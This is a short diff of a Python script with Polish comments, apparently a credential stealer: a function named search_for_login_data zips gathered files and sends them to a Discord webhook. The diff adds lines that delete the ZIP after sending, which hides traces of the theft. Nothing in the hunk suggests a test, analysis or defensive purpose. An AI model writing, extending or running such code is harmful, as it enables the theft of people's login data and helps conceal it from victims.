@@ -74,6 +74,12 @@ def search_for_login_data():
         # Wysyłanie ZIP-a na Discord
         if len(files_to_zip) > 0:
             send_file_to_discord(zip_file_name, webhook_url_1)
+            
+            # Usuwanie pliku ZIP po wysłaniu
+            os.remove(zip_file_name)
+            print(f"Plik {zip_file_name} został usunięty po wysłaniu.")
+        else:
+            print("Brak plików do spakowania i wysłania.")
 
 # Uruchomienie przeszukiwania
 search_for_login_data()
